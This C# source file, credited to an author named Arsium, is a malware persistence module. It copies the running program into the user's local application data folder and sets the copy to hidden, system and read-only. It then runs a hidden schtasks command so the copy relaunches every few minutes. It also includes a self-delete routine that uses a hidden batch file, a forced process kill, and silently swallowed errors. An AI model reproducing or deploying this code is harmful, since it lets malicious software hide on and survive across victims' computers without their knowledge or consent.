using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Persistence
{
    public static class Launch
    {
        internal static string ProgramPath = Application.ExecutablePath;
        internal static string ExecName = AppDomain.CurrentDomain.FriendlyName;
   
        public static void StartUpTaskScheduler(string Time, string TaskName)
        {
            try
            {
                if (Time == "" || Time == "%1%" || TaskName == "" || TaskName == "%C%")
                    return;

                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + ExecName;

                if (File.Exists(newPath) == false)
                {
                    File.WriteAllBytes(newPath, File.ReadAllBytes(ProgramPath));
                    Imports.SetFileAttributes(newPath, Imports.FileAttributes.Hidden | Imports.FileAttributes.System | Imports.FileAttributes.Readonly);
                }
                string ShellCMD = "schtasks /create /sc minute /mo 1 /tn \"||\" /tr \"" + newPath + "\"";
                Interaction.Shell(ShellCMD.Replace("||", TaskName).Replace("1", Time), AppWinStyle.Hide, false, -1);
            }
            catch {}
        }

        public static void RemoveTaskScheduler(string TaskName)
        {
            try
            {
                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ExecName;
                try
                { File.Delete(newPath); }
                catch { }
                string ShellCMD = "schtasks /delete /tn " + TaskName + " /f";
                Interaction.Shell(ShellCMD, AppWinStyle.Hide, false, -1);
                //InitiateSelfDestructSequence();
                Imports.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
            }
            catch {} //(Exception ex) { MessageBox.Show(ex.ToString()); }
        }

        private static void InitiateSelfDestructSequence()
        {
            try 
            {
                string batch = Path.GetTempFileName() + ".bat";
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 3 > NUL");
                    sw.WriteLine("CD " + Application.StartupPath);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }
                Process.Start(new ProcessStartInfo()
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            } 
            catch { }
        }
    }
}
